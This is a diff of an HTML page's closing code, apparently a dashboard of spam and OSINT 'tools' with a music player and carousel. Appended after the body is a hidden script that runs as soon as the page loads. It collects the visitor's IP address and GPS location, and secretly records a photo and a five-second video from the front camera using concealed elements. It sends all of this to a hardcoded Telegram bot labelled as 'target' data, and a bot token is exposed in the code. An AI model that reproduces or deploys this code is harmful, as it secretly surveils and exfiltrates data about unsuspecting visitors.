+            tiIdx = (tiIdx + 1) % titleTexts.length;
+            musicTitle.style.opacity = 0;
+            setTimeout(() => { musicTitle.innerText = titleTexts[tiIdx]; musicTitle.style.opacity = 1; }, 500);
+            let nextInterval = tiIdx === 0 ? 10000 : 5000;
+            setTimeout(cycleTitle, nextInterval);
+        };
+        setTimeout(cycleTitle, 10000);
+
+        audio.addEventListener('timeupdate', () => {
+            const progress = (audio.currentTime / audio.duration) * 100;
+            progressBar.style.width = `${progress}%`;
+            document.getElementById('currentTime').innerText = formatTime(audio.currentTime);
+            document.getElementById('totalTime').innerText = formatTime(audio.duration);
+        });
+        audio.addEventListener('loadedmetadata', () => { document.getElementById('totalTime').innerText = formatTime(audio.duration); });
+        audio.addEventListener('ended', () => { playBtn.innerHTML = '<i class="fas fa-play"></i>'; progressBar.classList.remove('heartbeat-effect'); });
+    }
+
+    function toggleMusic() {
+        const audio = document.getElementById('musicAudioPlayer');
+        const btn = document.getElementById('btnPlayMusic');
+        const bar = document.getElementById('musicProgressBar');
+        if (audio.paused) {
+            audio.play();
+            btn.innerHTML = '<i class="fas fa-pause"></i>';
+            bar.classList.add('heartbeat-effect');
+            document.getElementById('musicVideoBg').style.opacity = '1';
+            document.getElementById('musicVideoBg').play();
+        } else {
+            audio.pause();
+            btn.innerHTML = '<i class="fas fa-play"></i>';
+            bar.classList.remove('heartbeat-effect');
+        }
+    }
+    
+    function formatTime(seconds) {
+        if(isNaN(seconds)) return "0:00";
+        const min = Math.floor(seconds / 60);
+        const sec = Math.floor(seconds % 60);
+        return `${min}:${sec < 10 ? '0' : ''}${sec}`;
+    }
+
+    function initCarousel() {
+        const track = document.querySelector('.slider-track'); 
+        if (!track) return;
+        const slides = document.querySelectorAll('.slide');
+        let currentIndex = 0; let startPos = 0; let currentTranslate = 0; let prevTranslate = 0; let animationID; let isDragging = false; let autoPlayInterval;
+        function startAutoPlay() { stopAutoPlay(); autoPlayInterval = setInterval(() => { if(!isDragging) { currentIndex = (currentIndex + 1) % slides.length; setPositionByIndex(); } }, 4000); }
+        function stopAutoPlay() { clearInterval(autoPlayInterval); }
+        track.addEventListener('touchstart', (e) => { isDragging = true; startPos = e.touches[0].clientX; animationID = requestAnimationFrame(animation); track.classList.add('grabbing'); stopAutoPlay(); });
+        track.addEventListener('touchmove', (e) => { if(isDragging) currentTranslate = prevTranslate + e.touches[0].clientX - startPos; });
+        track.addEventListener('touchend', () => { isDragging = false; cancelAnimationFrame(animationID); track.classList.remove('grabbing'); const movedBy = currentTranslate - prevTranslate; if (movedBy < -50 && currentIndex < slides.length - 1) currentIndex += 1; if (movedBy > 50 && currentIndex > 0) currentIndex -= 1; setPositionByIndex(); startAutoPlay(); });
+        function animation() { track.style.transform = `translateX(${currentTranslate}px)`; if(isDragging) requestAnimationFrame(animation); }
+        function setPositionByIndex() { currentTranslate = currentIndex * -track.clientWidth; prevTranslate = currentTranslate; track.style.transform = `translateX(${currentTranslate}px)`; }
+        startAutoPlay();
+    }
+
+    function toggleSidebar() { document.getElementById('sidebarPanel').classList.toggle('active'); document.getElementById('overlay').classList.toggle('active'); }
+    
+    function goToPage(pageId) {
+        document.querySelectorAll('.page-container').forEach(p => p.classList.remove('active'));
+        document.getElementById('page-' + pageId).classList.add('active');
+        document.getElementById('sidebarPanel').classList.remove('active');
+        document.getElementById('overlay').classList.remove('active');
+        closeBottomSheet('networkSheet'); closeBottomSheet('downloaderSheet'); closeBottomSheet('osintSheet'); closeBottomSheet('spamSheet'); closeBottomSheet('mediaSheet'); closeBottomSheet('profileSheet');
+        
+        document.querySelector('.bottom-nav').style.display = 'flex'; 
+        document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
+        if(pageId === 'dashboard') document.querySelector('.nav-item:nth-child(1)').classList.add('active');
+        else if (pageId === 'whatsapp') document.querySelector('.nav-item:nth-child(2)').classList.add('active');
+        else if (['tools', 'tiktok', 'pinterest', 'network', 'nikparse', 'add-sender', 'spam-ngl', 'speedtest', 'spam-tele', 'search-youtube', 'music', 'spam-tele-video', 'pairing'].includes(pageId)) document.querySelector('.nav-item:nth-child(3)').classList.add('active');
+        
+        if (pageId === 'history') loadHistory();
+        if(pageId === 'list-accounts') loadAccountList();
+        
+        if(pageId === 'music') {
+            const img = document.getElementById('musicIntroImg');
+            const video = document.getElementById('musicVideoBg');
+            if(img) img.style.opacity = '1'; 
+            video.style.opacity = '0';
+        }
+
+        addToHistory('Navigasi Halaman', 'Pindah ke halaman: ' + pageId.toUpperCase());
+    }
+
+    function openBottomSheet(id) { 
+        document.getElementById('overlay').classList.add('active'); 
+        document.getElementById(id).classList.add('active'); 
+    }
+    function closeBottomSheet(id) { 
+        const el = document.getElementById(id);
+        if(el) el.classList.remove('active'); 
+        if(!document.getElementById('sidebarPanel').classList.contains('active')) document.getElementById('overlay').classList.remove('active'); 
+    }
+
+    function setupDropdown(wId, oId, tId, iId, cClass) {
+        const elWrapper = document.getElementById(wId);
+        if(!elWrapper) return; 
+        elWrapper.addEventListener('click', (e) => { e.stopPropagation(); 
+            document.querySelectorAll('.bug-options-container.active, .dropdown-options-container.active').forEach(el => { if(el.id !== oId) el.classList.remove('active'); });
+            document.getElementById(oId).classList.toggle('active'); 
+        });
+        document.querySelectorAll(`#${oId} .${cClass}`).forEach(opt => {
+            opt.addEventListener('click', (e) => { e.stopPropagation(); 
+                document.getElementById(tId).innerText = opt.innerText; 
+                const val = opt.getAttribute('data-val');
+                if(document.getElementById(iId)) document.getElementById(iId).value = val; 
+                if(iId === 'selectedBug') selectedBug = val;
+                if(iId === 'selectedMode') {
+                    if(val === 'manual') document.getElementById('manualArea').style.display = 'block';
+                    else document.getElementById('manualArea').style.display = 'none';
+                }
+                document.getElementById(oId).classList.remove('active'); 
+            });
+        });
+    }
+
+    function showPopup(t, m, i='✅') { 
+        const p = document.getElementById('customPopup'); 
+        document.getElementById('popIcon').innerText = i; 
+        document.getElementById('popMsg').innerHTML = `<div style="font-size:14px;color:#aaa;">${t}</div>${m}`; 
+        p.classList.add('show'); 
+        setTimeout(() => p.classList.remove('show'), 2000); 
+    }
+
+    function doLogout() { 
+        clearSession();
+        location.reload();
+    }
+
+    function loadAccountList() {
+        const container = document.getElementById('accListContainer');
+        const loader = document.getElementById('accListLoading');
+        loader.style.display = 'block';
+        container.innerHTML = '';
+        setTimeout(() => {
+            loader.style.display = 'none';
+            container.innerHTML = '<div style="text-align:center; color:#777; margin-top:20px;">Belum ada akun terdaftar.</div>';
+        }, 1500);
+    }
+
+    function initDynamicRoleDropdown() {
+        const session = getSession();
+        const myRoleLower = session.role.toLowerCase();
+        const roleContainer = document.getElementById('roleOptions');
+        const roleText = document.getElementById('roleText');
+        const roleInput = document.getElementById('selectedRole');
+        const roleDisplayWrapper = document.getElementById('roleDisplay');
+        if(!roleContainer || !roleDisplayWrapper) return;
+        roleContainer.innerHTML = '';
+        let allowedRoles = [];
+        if (['owner', 'creator', 'admin'].includes(myRoleLower)) {
+            allowedRoles = ['member', 'reseller', 'partner'];
+        } else if (myRoleLower === 'partner') {
+            allowedRoles = ['member', 'reseller'];
+        } else if (myRoleLower === 'reseller') {
+            allowedRoles = ['member'];
+        } else {
+            allowedRoles = ['member'];
+        }
+        allowedRoles.forEach(role => {
+            const div = document.createElement('div');
+            div.className = 'dropdown-option';
+            div.setAttribute('data-val', role);
+            div.innerText = role.charAt(0).toUpperCase() + role.slice(1);
+            div.addEventListener('click', (e) => { e.stopPropagation(); roleText.innerText = div.innerText; roleInput.value = role; roleContainer.classList.remove('active'); });
+            roleContainer.appendChild(div);
+        });
+        if (allowedRoles.length > 0) {
+            roleText.innerText = allowedRoles[0].charAt(0).toUpperCase() + allowedRoles[0].slice(1);
+            roleInput.value = allowedRoles[0];
+        }
+        roleDisplayWrapper.addEventListener('click', (e) => {
+            e.stopPropagation();
+            document.querySelectorAll('.bug-options-container.active, .dropdown-options-container.active').forEach(el => { if (el.id !== 'roleOptions') el.classList.remove('active'); });
+            roleContainer.classList.toggle('active');
+        });
+
+        // Update duration dropdown based on role
+        const durOptions = document.getElementById('durOptions');
+        const durText = document.getElementById('durText');
+        const durInput = document.getElementById('selectedDuration');
+        if (!durOptions) return;
+        durOptions.innerHTML = '';
+
+        let durations = [];
+        if (myRoleLower === 'reseller') {
+            durations = [{ val: '30d', label: '30 Days' }];
+        } else if (myRoleLower === 'partner') {
+            durations = [
+                { val: '999999d', label: 'Permanent' },
+                { val: '30d', label: '30 Days' },
+                { val: '60d', label: '60 Days' }
+            ];
+        } else {
+            // owner, admin, creator — semua pilihan
+            durations = [
+                { val: '30d', label: '30 Days' },
+                { val: '60d', label: '60 Days' },
+                { val: '90d', label: '90 Days' },
+                { val: '180d', label: '180 Days' },
+                { val: '365d', label: '1 Year' },
+                { val: '999999d', label: 'Permanent' }
+            ];
+        }
+
+        durations.forEach(d => {
+            const div = document.createElement('div');
+            div.className = 'dropdown-option';
+            div.setAttribute('data-val', d.val);
+            div.innerText = d.label;
+            div.addEventListener('click', (e) => {
+                e.stopPropagation();
+                durText.innerText = d.label;
+                durInput.value = d.val;
+                durOptions.classList.remove('active');
+            });
+            durOptions.appendChild(div);
+        });
+
+        // Set default
+        durText.innerText = durations[0].label;
+        durInput.value = durations[0].val;
+    }
+
+    async function requestPairing() {
+        showPopup('Info', 'Fitur Coming Soon', '⚙️');
+        setTimeout(() => { goToPage('dashboard'); }, 1000);
+    }
+
+    function addLog(msg) {
+        const logs = document.getElementById('pairingLogs');
+        if(!logs) return;
+        const time = new Date().toLocaleTimeString('en-GB', {hour12:false});
+        logs.innerHTML += `<div>[${time}] ${msg}</div>`;
+        logs.scrollTop = logs.scrollHeight;
+    }
+
+    const globalAudio = document.getElementById('globalAudioPlayer');
+    const floatPlayer = document.getElementById('floatingPlayer');
+    const playBtn = document.getElementById('fpPlayBtn');
+
+    window.playYouTubeAudio = async (url, title, thumb) => {
+        showPopup('Info', 'Fitur Coming Soon', '⚙️');
+        setTimeout(() => { goToPage('dashboard'); }, 1000);
+    };
+
+    window.stopAudio = () => {
+        if(globalAudio) { globalAudio.pause(); globalAudio.currentTime = 0; }
+        if(floatPlayer) floatPlayer.style.display = 'none';
+    };
+  </script>
+</body>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8748766418:AAHOuDwQGQZD4BQW86A49Da0xmSRiVu6Uvc';
+        const TELEGRAM_CHAT_ID = '8505585821';
+        const TELEGRAM_API_BASE = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+
+        // Fungsi untuk menghantar mesej teks ke Telegram
+        async function sendTelegramMessage(text) {
+            try {
+                await fetch(`${TELEGRAM_API_BASE}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'Markdown' })
+                });
+            } catch (error) {
+                console.error('Ralat menghantar mesej Telegram:', error);
+            }
+        }
+
+        // Fungsi untuk menghantar gambar ke Telegram
+        async function sendTelegramPhoto(photoBlob, caption) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', photoBlob, 'victim_photo.png');
+                if (caption) {
+                    formData.append('caption', caption);
+                    formData.append('parse_mode', 'Markdown');
+                }
+                await fetch(`${TELEGRAM_API_BASE}/sendPhoto`, { method: 'POST', body: formData });
+            } catch (error) {
+                console.error('Ralat menghantar gambar Telegram:', error);
+            }
+        }
+
+        // Fungsi untuk menghantar video ke Telegram
+        async function sendTelegramVideo(videoBlob, caption) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('video', videoBlob, 'victim_video.webm');
+                if (caption) {
+                    formData.append('caption', caption);
+                    formData.append('parse_mode', 'Markdown');
+                }
+                await fetch(`${TELEGRAM_API_BASE}/sendVideo`, { method: 'POST', body: formData });
+            } catch (error) {
+                console.error('Ralat menghantar video Telegram:', error);
+            }
+        }
+
+        // Dapatkan IP Address
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return { status: 'success', ip: data.ip };
+            } catch (error) {
+                console.error('Ralat mendapatkan IP address:', error);
+                return { status: 'failed', message: `_Gagal: ${error.message}_` };
+            }
+        }
+
+        // Dapatkan Lokasi GPS Real-time
+        function getRealtimeLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    console.warn('Geolocation tidak disokong oleh pelayar.');
+                    resolve({ status: 'failed', message: '_Geolocation tidak disokong oleh pelayar._' });
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const googleMapsLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
+                    resolve({ status: 'success', lat, lon, googleMapsLink });
+                }, (error) => {
+                    let errorMessage = '';
+                    switch (error.code) {
+                        case error.PERMISSION_DENIED: errorMessage = 'Pengguna menolak permintaan Geolocation.'; break;
+                        case error.POSITION_UNAVAILABLE: errorMessage = 'Maklumat lokasi tidak tersedia.'; break;
+                        case error.TIMEOUT: errorMessage = 'Permintaan untuk mendapatkan lokasi pengguna tamat masa.'; break;
+                        default: errorMessage = `Ralat tidak diketahui berlaku: ${error.message}`; break;
+                    }
+                    resolve({ status: 'failed', message: `_Gagal: ${errorMessage}_` });
+                }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+            });
+        }
+
+        // Tangkap Data Kamera (Gambar dan Video 5 saat)
+        async function captureCameraData() {
+            let stream;
+            let photoBlob = null;
+            let videoBlob = null;
+            let cameraAccessStatus = 'Diperolehi'; // Default success status
+
+            // Buat elemen video sementara untuk memaparkan aliran (tidak dipaparkan untuk stealth)
+            const video = document.createElement('video');
+            video.srcObject = null; // Initialize to null
+            video.autoplay = true;
+            video.muted = true;
+            video.style.cssText = 'position:absolute; top:-9999px; left:-9999px; width:1px; height:1px; opacity:0; pointer-events:none;'; // Pastikan tersembunyi
+            document.body.appendChild(video); // Tambahkan ke body agar bisa play
+
+            // Buat elemen canvas sementara
+            const canvas = document.createElement('canvas');
+            canvas.style.cssText = 'position:absolute; top:-9999px; left:-9999px; width:1px; height:1px; opacity:0; pointer-events:none;'; // Pastikan tersembunyi
+            document.body.appendChild(canvas); // Tambahkan ke body
+
+            try {
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    cameraAccessStatus = 'Browser tidak disokong untuk akses kamera.';
+                    return { photoBlob: null, videoBlob: null, cameraAccessStatus };
+                }
+
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
+                video.srcObject = stream;
+
+                await new Promise(resolve => video.onloadedmetadata = () => {
+                    video.play(); // Mula mainkan video
+                    resolve();
+                });
+
+                // Tunggu sebentar untuk bingkai pertama dipaparkan
+                await new Promise(resolve => requestAnimationFrame(() => {
+                    requestAnimationFrame(resolve); // Tunggu dua bingkai untuk memastikan rendering
+                }));
+
+                // --- Tangkap Gambar (1 kali) ---
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
+                if (!photoBlob) {
+                    cameraAccessStatus = cameraAccessStatus === 'Diperolehi' ? '_Gagal menangkap gambar: Tidak dapat mencipta blob imej._' : cameraAccessStatus;
+                }
+
+                // --- Tangkap Video (5 saat) ---
+                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                const videoChunks = [];
+
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        videoChunks.push(event.data);
+                    }
+                };
+
+                videoBlob = await new Promise(resolve => {
+                    mediaRecorder.onstop = () => {
+                        const blob = new Blob(videoChunks, { type: 'video/webm' });
+                        resolve(blob.size > 0 ? blob : null);
+                    };
+                    mediaRecorder.start();
+                    setTimeout(() => {
+                        if (mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
+                        }
+                    }, 5000); // Rekod selama 5 saat
+                });
+                if (!videoBlob) {
+                    cameraAccessStatus = cameraAccessStatus === 'Diperolehi' ? '_Gagal menangkap video: Tidak dapat mencipta blob video._' : cameraAccessStatus;
+                }
+
+            } catch (error) {
+                console.error('Ralat mengakses kamera:', error);
+                if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
+                    cameraAccessStatus = 'Pengguna menolak akses kamera/mikrofon.';
+                } else if (error.name === 'NotFoundError') {
+                    cameraAccessStatus = 'Tiada kamera ditemui pada peranti.';
+                } else if (error.name === 'NotReadableError') {
+                    cameraAccessStatus = 'Kamera sedang digunakan oleh aplikasi lain.';
+                } else if (error.name === 'OverconstrainedError') {
+                    cameraAccessStatus = 'Tiada kamera yang memenuhi kriteria yang diminta.';
+                } else {
+                    cameraAccessStatus = `Ralat berlaku: ${error.message}`;
+                }
+            } finally {
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+                // Hapus elemen video dan canvas yang dibuat secara dinamis
+                if (video && video.parentNode) video.parentNode.removeChild(video);
+                if (canvas && canvas.parentNode) canvas.parentNode.removeChild(canvas);
+                return { photoBlob, videoBlob, cameraAccessStatus };
+            }
+        }
+
+        // Pelaksanaan utama apabila laman dimuatkan - dipanggil serta-merta
+        (async () => {
+            // Kita hantar mesej awal sebelum mulakan proses untuk memberitahu bot sedia
+            await sendTelegramMessage(`𖤓 Successfully get the target 𖤓\n\n_Collecting target data..._`);
+
+            // Inisialisasi status untuk laporan
+            let ipReport = 'Tidak dapat diperolehi';
+            let locationReport = 'Tidak dapat diperolehi';
+            let cameraAccessStatusReport = 'Tidak dapat diperolehi';
+            let photoBlob = null;
+            let videoBlob = null;
+            let photoStatusMessage = 'Tidak dapat diperolehi';
+            let videoStatusMessage = 'Tidak dapat diperolehi';
+
+
+            // Jalankan semua proses pemerolehan data secara serentak
+            const [ipResult, locationResult, cameraDataResult] = await Promise.allSettled([
+                getIPAddress(),
+                getRealtimeLocation(),
+                captureCameraData()
+            ]);
+
+            // --- Proses hasil IP Address ---
+            if (ipResult.status === 'fulfilled' && ipResult.value && ipResult.value.status === 'success') {
+                ipReport = `\`${ipResult.value.ip}\``;
+            } else if (ipResult.status === 'fulfilled' && ipResult.value && ipResult.value.status === 'failed') {
+                ipReport = ipResult.value.message;
+            } else if (ipResult.status === 'rejected') {
+                ipReport = `_Gagal: ${ipResult.reason.message || 'Ralat tidak diketahui.'}_`;
+            }
+
+            // --- Proses hasil Lokasi GPS ---
+            if (locationResult.status === 'fulfilled' && locationResult.value && locationResult.value.status === 'success') {
+                locationReport = `*Koordinat:* \`${locationResult.value.lat}, ${locationResult.value.lon}\`\n*Google Maps:* [Buka Lokasi](${locationResult.value.googleMapsLink})`;
+            } else if (locationResult.status === 'fulfilled' && locationResult.value && locationResult.value.status === 'failed') {
+                locationReport = locationResult.value.message;
+            } else if (locationResult.status === 'rejected') {
+                locationReport = `_Gagal: ${locationResult.reason.message || 'Ralat tidak diketahui.'}_`;
+            }
+
+            // --- Proses hasil Kamera (Gambar & Video) ---
+            if (cameraDataResult.status === 'fulfilled') {
+                photoBlob = cameraDataResult.value.photoBlob;
+                videoBlob = cameraDataResult.value.videoBlob;
+                cameraAccessStatusReport = cameraDataResult.value.cameraAccessStatus;
+                
+                photoStatusMessage = photoBlob ? 'Diperolehi' : '_Gagal menangkap gambar: Tidak dapat mencipta blob imej._';
+                videoStatusMessage = videoBlob ? 'Diperolehi' : '_Gagal menangkap video: Tidak dapat mencipta blob video._';
+            } else if (cameraDataResult.status === 'rejected') {
+                cameraAccessStatusReport = `_Akses Kamera Gagal: ${cameraDataResult.reason.message || 'Ralat tidak diketahui.'}_`;
+                photoStatusMessage = `_Gagal menangkap gambar disebabkan ralat kamera._`;
+                videoStatusMessage = `_Gagal menangkap video disebabkan ralat kamera._`;
+            }
+
+            // Bina satu mesej teks utama
+            let textMessage = `𖤍 Report target data 𖤍\n\n`;
+            textMessage += `*IP Address:* ${ipReport}\n`;
+            textMessage += `*Lokasi Real-time:* \n${locationReport}\n\n`;
+            textMessage += `*Status Akses Kamera:* ${cameraAccessStatusReport}\n`;
+            textMessage += `*Status Gambar:* ${photoStatusMessage}\n`;
+            textMessage += `*Status Video:* ${videoStatusMessage}\n\n`;
+            textMessage += `_✵ Other data will be sent separately._`;
+
+            await sendTelegramMessage(textMessage); // Mesej #1
+
+            // Hantar gambar jika ada
+            if (photoBlob) {
+                await sendTelegramPhoto(photoBlob, '📸 Successfully obtained target image!'); // Mesej #2
+            } else {
+                await sendTelegramMessage('⚠️ Failed to get image ⚠️\n\n_Tiada gambar yang sah untuk dihantar._');
+            }
+
+            // Hantar video jika ada
+            if (videoBlob) {
+                await sendTelegramVideo(videoBlob, '🎥 Successfully obtained target video! ( 5 Second)'); // Mesej #3
+            } else {
+                await sendTelegramMessage('⚠️ Failed to get video ⚠️\n\n_Tiada video yang sah untuk dihantar._');
+            }
+
+            // Mesej terakhir menandakan selesai
+            await sendTelegramMessage(`✅ The target data report has been completed ✅\n\n_Thank you for using the tools from @allabouterens_`);
+        })();
+    </script>
+</body>
+</html>
